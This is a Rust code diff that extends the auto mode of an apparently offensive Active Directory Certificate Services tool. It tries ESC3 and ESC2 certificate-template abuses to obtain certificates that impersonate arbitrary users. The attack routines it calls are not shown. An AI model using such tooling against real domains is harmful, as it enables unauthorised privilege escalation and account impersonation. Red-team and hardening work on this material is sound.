@@ -343,6 +343,66 @@ async fn execute_auto(
         }
     }
 
+    // Try ESC3 next (Enrollment Agent EKU chain -- allows agent to request
+    // certs for any user).  Uses the same template as both agent and target.
+    info!("Auto mode: attempting ESC3 on template '{}'", template);
+    match execute_esc3(config, template, upn).await {
+        Ok(result) if result.success => {
+            info!("ESC3 attack succeeded!");
+            return Ok(AdcsResult {
+                action: "Auto (ESC3)".to_string(),
+                ca_server: ca_server.clone(),
+                success: true,
+                certificate_pfx: result.certificate_pfx,
+                certificate_thumbprint: result.certificate_thumbprint,
+                message: result.message,
+                next_steps: vec![
+                    "ESC3 -- Enrollment Agent EKU present".to_string(),
+                    "Use agent cert to request certs for any user without SAN restrictions"
+                        .to_string(),
+                    format!("Escalation path: {} can impersonate any user via CA", upn),
+                ],
+            });
+        }
+        Ok(result) => {
+            warn!("ESC3 failed: {}", result.message);
+            next_steps.push(format!("ESC3 failed: {}", result.message));
+        }
+        Err(e) => {
+            warn!("ESC3 error: {}", e);
+            next_steps.push(format!("ESC3 error: {}", e));
+        }
+    }
+
+    // Try ESC2 (Any Purpose EKU -- broader than ESC3, allows any usage)
+    info!("Auto mode: attempting ESC2 on template '{}'", template);
+    match execute_esc2(config, template, upn).await {
+        Ok(result) if result.success => {
+            info!("ESC2 attack succeeded!");
+            return Ok(AdcsResult {
+                action: "Auto (ESC2)".to_string(),
+                ca_server: ca_server.clone(),
+                success: true,
+                certificate_pfx: result.certificate_pfx,
+                certificate_thumbprint: result.certificate_thumbprint,
+                message: result.message,
+                next_steps: vec![
+                    "ESC2 -- Any Purpose EKU present".to_string(),
+                    "Certificate can be used for any authentication purpose".to_string(),
+                    "NB: ESC2 is broader than ESC3 -- consider CA template hardening".to_string(),
+                ],
+            });
+        }
+        Ok(result) => {
+            warn!("ESC2 failed: {}", result.message);
+            next_steps.push(format!("ESC2 failed: {}", result.message));
+        }
+        Err(e) => {
+            warn!("ESC2 error: {}", e);
+            next_steps.push(format!("ESC2 error: {}", e));
+        }
+    }
+
     // Try ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)
     info!("Auto mode: attempting ESC6 on template '{}'", template);
     match execute_esc6(config, template, upn).await {
